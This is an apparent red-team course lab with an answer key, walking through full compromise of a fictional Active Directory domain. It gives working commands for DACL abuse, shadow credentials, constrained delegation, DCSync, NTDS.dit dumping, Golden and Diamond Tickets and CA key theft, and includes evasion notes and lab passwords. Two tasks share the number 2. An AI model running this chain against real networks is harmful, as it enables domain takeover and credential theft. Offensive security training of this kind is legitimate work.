# LAB 9 — Capstone

Complete the full attack chain from WS01 to domain compromise. This lab builds directly on all previous labs — refer back to them for commands and context.

---

## Task 1 — Complete the DACL Chain

Continue from where LAB 8 Task 1 stopped — `devin.aguirre` is now a member of `RECREATION`. Walk the remaining DACL chain to gain control of `effie.carr`.  
> Note: You may need to restart WS01 for the group permissions to be applied.  


---

## Task 2 — Compromise DC01 via Shadow Credentials

`effie.carr` has **GenericAll** on `DC01$`. Use shadow credentials to obtain a TGT for the DC machine account — `DC01$`'s TGT carries replication rights, enabling DCSync without a service ticket or S4U chain.

> :no_entry: ***OPSEC:*** DCSync traffic originating from a non-domain-controller is a high-fidelity indicator of compromise. Domain controllers replicate with each other — replication requests from a workstation or member server are anomalous and will trigger alerts in EDR and SIEM solutions monitoring for `4662` events or directory replication traffic.


---

## Task 2 — Compromise DC01 via Constrained Delegation

`effie.carr` has **WriteOwner** on a computer account that already has constrained delegation configured to `DC01`. Identify the target computer using BloodHound, ldapsearch, or LDAP BOFs. Take ownership of it, reset its password, then use S4U2Proxy to obtain a service ticket as Administrator — no RBCD write required.

**Discovery — find the computer with delegation to DC01:**

```bash
# BloodHound — Kerberos delegation edges
# Cypher: MATCH (c:Computer)-[:AllowedToDelegate]->(t:Computer {name:"DC01.CHEDDARSALE.LOCAL"}) RETURN c.name
```

```bash
# LDAP BOF — query all computers with delegation configured
beacon> ldapsearch "(&(objectClass=computer)(msDS-AllowedToDelegateTo=*))" --attributes sAMAccountName,msDS-AllowedToDelegateTo -dc DC01.cheddarsale.local
```

```bash
# Get delegation details for a specific computer
beacon> ldap get-delegation <DISCOVERED COMPUTER>$ -dc DC01.cheddarsale.local
```

---

## Task 3 — Dump Active Directory

With domain compromise achieved (Administrator ticket injected from Task 2 or Task 3), dump credentials using multiple methods.

### Method 1 — DCSync via Beacon

```bash
beacon> dcsync single krbtgt -dc DC01.cheddarsale.local
beacon> dcsync single Administrator -dc DC01.cheddarsale.local
beacon> dcsync all -dc DC01.cheddarsale.local --only-nt
beacon> dcsync all -dc DC01.cheddarsale.local --only-users
```

### Method 2 — Backup NTDS.dit via P2P Beacon on DC01

Use the injected Administrator ticket to jump to DC01 and establish a P2P beacon, then run ntdsutil directly from the DC:

```bash
# PsExec — uploads a service binary and creates a temporary service
beacon> jump psexec DC01.cheddarsale.local ~/AdaptixProjects/<YOUR PROJECT>/Payloads/svc_agent_smb.exe

# SCShell — modifies an existing service binary path (fileless, no upload)
beacon> jump scshell DC01.cheddarsale.local <SERVICE_NAME> ~/AdaptixProjects/<YOUR PROJECT>/Payloads/svc_agent_smb.exe
```

From the DC01 P2P beacon:

```bash
dc01_beacon> ps run ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds_backup" "quit" "quit"
dc01_beacon> download "C:\Windows\Temp\ntds_backup\Active Directory\ntds.dit"
dc01_beacon> download C:\Windows\Temp\ntds_backup\registry\SYSTEM
```

Parse offline on Kali:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Method 3 — Secrets Dump via impacket

Export the Administrator ticket from the beacon, convert it, and run secretsdump through the SOCKS proxy:

```bash
beacon> kerbeus dump
beacon> download <ticket_file>
```

```bash
impacket-ticketConverter <ticket_file> administrator.ccache
export KRB5CCNAME=administrator.ccache
```

```bash
proxychains4 secretsdump.py -k -no-pass cheddarsale.local/Administrator@DC01.cheddarsale.local
```

### Method 4 — netexec

```bash
proxychains4 netexec smb DC01 -u Administrator -p "" --use-kcache --ntds
```

---

## Task 4 — Golden Ticket

Use the `krbtgt` hash from the secretsdump output to forge a Golden Ticket — a TGT valid for any user in the domain with no expiration. Save the ticket to disk so it can be exported to Kali as a ccache:

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe golden /user:Administrator /domain:cheddarsale.local /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM_HASH> /outfile:golden.kirbi /ptt /nowrap
beacon> kerbeus klist
beacon> download golden.kirbi
```

```bash
impacket-ticketConverter golden.kirbi golden.ccache
export KRB5CCNAME=golden.ccache
proxychains4 netexec smb DC01 --use-kcache
```

---

## Task 5 — Diamond Ticket

A Diamond Ticket is a stealthier alternative to a Golden Ticket. Instead of forging a TGT from scratch, it requests a legitimate TGT from the KDC and modifies the PAC in-place using the `krbtgt` key — producing a ticket with a valid KDC signature that detection tools looking for unsigned PACs will miss.

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:<KRBTGT_AES256_KEY> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /outfile:diamond.kirbi /ptt /nowrap
beacon> kerbeus klist
beacon> download diamond.kirbi
```

```bash
impacket-ticketConverter diamond.kirbi diamond.ccache
export KRB5CCNAME=diamond.ccache
proxychains4 netexec smb DC01 --use-kcache
```

> **Golden vs Diamond:** Golden Tickets are forged entirely offline and carry no KDC signature — modern detection can flag this. Diamond Tickets are issued by the real KDC and then patched, so the signature is valid. Both require the `krbtgt` key and persist until `krbtgt` is rotated twice.

---

## Task 6 — Golden Cert

A Golden Cert abuses administrative access to the enterprise CA (DC01 in this lab) to extract its private key and forge certificates for any user in the forest. Unlike ticket-based persistence, forged certificates remain valid until the CA certificate itself expires — rotating `krbtgt` or resetting account passwords has no effect.

> **Reference:** [BloodHound GoldenCert edge](https://bloodhound.specterops.io/resources/edges/golden-cert)

---

### Method 1 — Certipy (Kali via SOCKS proxy)

**Step 1 — Back up the CA certificate and private key**

```bash
proxychains4 certipy ca -backup -ca 'cheddarsale-DC01-CA' -username effie.carr -password 'NewPassword123!' -dc-ip 192.168.57.10
```

**Step 2 — Forge a certificate**

```bash
certipy forge -ca-pfx cheddarsale-DC01-CA.pfx -upn Administrator@cheddarsale.local -subject 'CN=Administrator,CN=Users,DC=cheddarsale,DC=local'
```

**Step 3 — Authenticate with the forged certificate**

```bash
proxychains4 certipy auth -pfx administrator_forged.pfx -dc-ip 192.168.57.10
export KRB5CCNAME=administrator.ccache
proxychains4 netexec smb DC01 --use-kcache
```

Alternatively, use the NT hash directly:

```bash
proxychains4 netexec smb DC01 -u Administrator -H <NT_HASH>
```

---

### Method 2 — Certify (Windows via Beacon)

**Step 1 — Dump the CA certificate and private key**

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Certify.exe manage-self --dump-certs
beacon> download <ca_cert.pfx>
```

**Step 2 — Forge a certificate**

```bash
certipy forge -ca-pfx <ca_cert.pfx> -upn Administrator@cheddarsale.local -subject 'CN=Administrator,CN=Users,DC=cheddarsale,DC=local'
```

**Step 3 — Request a TGT with the forged certificate**

```bash
beacon> upload administrator_forged.pfx
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asktgt /user:Administrator /domain:cheddarsale.local /certificate:administrator_forged.pfx /dc:DC01.cheddarsale.local /ptt /nowrap
beacon> kerbeus klist
```

---

## Answers

<details>
<summary>Task 1 — Complete the DACL Chain</summary>

#### Adaptix / .NET

**Step 1 — AddMember: devin.aguirre → RECREATION**

```bash
beacon> ldap add-groupmember RECREATION devin.aguirre
beacon> ldap get-usergroups devin.aguirre
```

**Step 2 — GenericAll: RECREATION → sofia.cross**

```bash
beacon> rev2self
beacon> token make devin.aguirre 9i*mZrk4Jx8UrIY cheddarsale.local 9
beacon> ldap set-password sofia.cross NewPassword123!
beacon> rev2self
beacon> token make sofia.cross NewPassword123! cheddarsale.local 9
```

**Step 3 — WriteOwner: sofia.cross → alec.jarvis**

```bash
beacon> ldap set-owner alec.jarvis sofia.cross
beacon> ldap add-genericall alec.jarvis sofia.cross
beacon> ldap set-password alec.jarvis NewPassword123!
beacon> token make alec.jarvis NewPassword123! cheddarsale.local 9
```

**Step 4 — AddKeyCredentialLink: alec.jarvis → clinton.stewart**

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Whisker.exe list /target:clinton.stewart /domain:cheddarsale.local /dc:DC01.cheddarsale.local
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Whisker.exe add /target:clinton.stewart /domain:cheddarsale.local /dc:DC01.cheddarsale.local /path:C:\Users\Public\clinton.pfx /password:NewPassword123!
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Rubeus.exe asktgt /user:clinton.stewart /certificate:C:\Users\Public\clinton.pfx /password:NewPassword123! /domain:cheddarsale.local /dc:DC01.cheddarsale.local /getcredentials /ptt /nowrap
```

> **Note:** PKINIT tickets carry the `invalid` flag and cannot request service tickets directly. Use `/getcredentials` to recover the NT hash, then request a clean TGT:
> ```bash
> beacon> kerbeus asktgt /user:clinton.stewart /rc4:<NT_HASH> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap
> ```

Create a sacrificial process with a new logon session and inject the TGT into it — this allows LDAP BOF commands to authenticate as `clinton.stewart` without relying on `/ptt` in the beacon session:

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Rubeus.exe asktgt /user:clinton.stewart /rc4:1f2145709c6f2b30015a4fe9f43b39b2 /nowrap
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Rubeus.exe /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
```

Steal the token from the PID returned by `createnetonly`:

```bash
beacon> token steal <PID>
```

**Step 5 — WriteOwner: clinton.stewart → effie.carr**

```bash
beacon> ldap set-owner effie.carr clinton.stewart
beacon> ldap add-genericall effie.carr clinton.stewart
beacon> ldap set-password effie.carr NewPassword123!
beacon> rev2self
beacon> token make effie.carr NewPassword123! cheddarsale.local 2
```

#### Linux (proxychains)

**Step 3 — WriteOwner (if LDAP BOF returns constraint violation 0x13)**

```bash
proxychains4 bloodyAD -u sofia.cross -p 'NewPassword123!' -d cheddarsale.local -i 192.168.57.10 set owner alec.jarvis sofia.cross
proxychains4 bloodyAD -u sofia.cross -p 'NewPassword123!' -d cheddarsale.local -i 192.168.57.10 add genericAll alec.jarvis sofia.cross
proxychains4 bloodyAD -u sofia.cross -p 'NewPassword123!' -d cheddarsale.local -i 192.168.57.10 set password alec.jarvis 'NewPassword123!'
```

**Step 4 — AddKeyCredentialLink via pywhisker**

```bash
cd /opt/pywhisker && source .venv/bin/activate
proxychains4 python3 pywhisker/pywhisker.py -d cheddarsale.local -u alec.jarvis -p 'NewPassword123!' -t clinton.stewart -a add --dc-ip 192.168.57.10 --use-ldaps -v

cd /opt/PKINITtools
proxychains4 python3 gettgtpkinit.py -cert-pfx <pfx_file> -pfx-pass <pfx_password> cheddarsale.local/clinton.stewart clinton.stewart.ccache
export KRB5CCNAME=clinton.stewart.ccache
proxychains4 python3 getnthash.py -key <AS_REP_KEY> cheddarsale.local/clinton.stewart
```

**Step 5 — WriteOwner: clinton.stewart → effie.carr**

```bash
proxychains4 bloodyAD -u clinton.stewart -p :<NT_HASH> -d cheddarsale.local -i 192.168.57.10 set owner effie.carr clinton.stewart
proxychains4 bloodyAD -u clinton.stewart -p :<NT_HASH> -d cheddarsale.local -i 192.168.57.10 add genericAll effie.carr clinton.stewart
proxychains4 bloodyAD -u clinton.stewart -p :<NT_HASH> -d cheddarsale.local -i 192.168.57.10 set password effie.carr 'NewPassword123!'
```

> **Alternative — Kerberos ccache:**
> ```bash
> export KRB5CCNAME=/opt/PKINITtools/clinton.stewart.ccache
> proxychains4 bloodyAD -u clinton.stewart -k -d cheddarsale.local --dc-ip 192.168.57.10 set owner effie.carr clinton.stewart
> proxychains4 bloodyAD -u clinton.stewart -k -d cheddarsale.local --dc-ip 192.168.57.10 add genericAll effie.carr clinton.stewart
> proxychains4 bloodyAD -u clinton.stewart -k -d cheddarsale.local --dc-ip 192.168.57.10 set password effie.carr 'NewPassword123!'
> ```

</details>

---

<details>
<summary>Task 2 — Constrained Delegation</summary>

`effie.carr` has **WriteOwner** on `SRV03$`. `SRV03$` has constrained delegation (without protocol transition) to `CIFS/DC01` and `HTTP/DC01`. Take ownership of SRV03$, grant GenericAll, reset its password, then use S4U2Proxy to get a service ticket as Administrator.

#### Adaptix / .NET

```bash
beacon> token make effie.carr NewPassword123! cheddarsale.local 2
```

```bash
beacon> ldap set-owner SRV03$ effie.carr
beacon> ldap add-genericall SRV03$ effie.carr
beacon> ldap set-password SRV03$ P@ssw0rd! -dc DC01.cheddarsale.local
```

```bash
beacon> kerbeus hash /password:'P@ssw0rd!' /user:SRV03$ /domain:cheddarsale.local
```

```bash
beacon> kerbeus asktgt /user:SRV03$ /aes256:<AES256_HASH> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap
```

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe s4u /ticket:<base64_TGT> /impersonateuser:Administrator /msdsspn:cifs/DC01.cheddarsale.local /altservice:ldap,host /domain:cheddarsale.local /dc:DC01.cheddarsale.local /ptt /nowrap
```

```bash
beacon> dcsync single krbtgt -dc DC01.cheddarsale.local
beacon> dcsync single Administrator -dc DC01.cheddarsale.local
```

#### Linux (proxychains)

```bash
proxychains4 bloodyAD -u effie.carr -p 'NewPassword123!' -d cheddarsale.local -i 192.168.57.10 set owner 'SRV03$' effie.carr
proxychains4 bloodyAD -u effie.carr -p 'NewPassword123!' -d cheddarsale.local -i 192.168.57.10 add genericAll 'SRV03$' effie.carr
proxychains4 bloodyAD -u effie.carr -p 'NewPassword123!' -d cheddarsale.local -i 192.168.57.10 set password 'SRV03$' 'P@ssw0rd!'
```

```bash
proxychains4 impacket-getST -spn cifs/DC01.cheddarsale.local -impersonate Administrator -dc-ip 192.168.57.10 'cheddarsale.local/SRV03$:P@ssw0rd!'
```

```bash
export KRB5CCNAME=Administrator@cifs_DC01.cheddarsale.local@CHEDDARSALE.LOCAL.ccache
proxychains4 secretsdump.py -k -no-pass cheddarsale.local/Administrator@DC01.cheddarsale.local
```

</details>

---

<details>
<summary>Task 4 — Golden Ticket</summary>

- `krbtgt` hash: extracted from secretsdump NTDS output
- Domain SID: extracted from any domain object SID (first 7 dash-separated groups)
- Golden Ticket is valid indefinitely until `krbtgt` password is changed twice

</details>

---

<details>
<summary>Task 5 — Diamond Ticket</summary>

- `krbtgt` AES256 key: extracted from secretsdump NTDS output (listed as `aes256-cts-hmac-sha1-96`)
- Diamond Ticket survives password resets but is invalidated by rotating `krbtgt` twice

</details>

---

<details>
<summary>Task 6 — Golden Cert</summary>

- CA name: `cheddarsale-DC01-CA` (verify with `certipy find` or `ldap get-domaininfo`)
- Forged certificates persist until the CA certificate expires — unaffected by `krbtgt` rotation or password changes

</details>

---

<details>
<summary>Kerberos Ticket Operations</summary>

Reference for the full `kerbeus` command set.

#### Inspect Tickets

```bash
beacon> kerbeus triage
beacon> kerbeus klist
beacon> kerbeus dump
beacon> kerbeus describe <ticket>
```

#### Request Tickets

```bash
beacon> kerbeus asktgt /user:devin.aguirre /password:"9i*mZrk4Jx8UrIY" /domain:cheddarsale.local
beacon> kerbeus asktgt /user:devin.aguirre /rc4:<NTLM_HASH> /domain:cheddarsale.local
beacon> kerbeus asktgs /user:devin.aguirre /password:"9i*mZrk4Jx8UrIY" /domain:cheddarsale.local /spn:cifs/DC01.cheddarsale.local
beacon> kerbeus tgtdeleg
```

#### Submit and Manage Tickets

```bash
beacon> kerbeus ptt <ticket_file>
beacon> kerbeus renew <ticket_file>
beacon> kerbeus purge
```

#### Hash Utilities

```bash
beacon> kerbeus hash /password:"9i*mZrk4Jx8UrIY" /domain:cheddarsale.local /user:devin.aguirre
```

#### S4U Delegation

```bash
beacon> kerbeus s4u /user:SRV03$ /aes256:<AES256> /impersonateuser:Administrator /msdsspn:cifs/DC01.cheddarsale.local /domain:cheddarsale.local /ptt
```

</details>

---
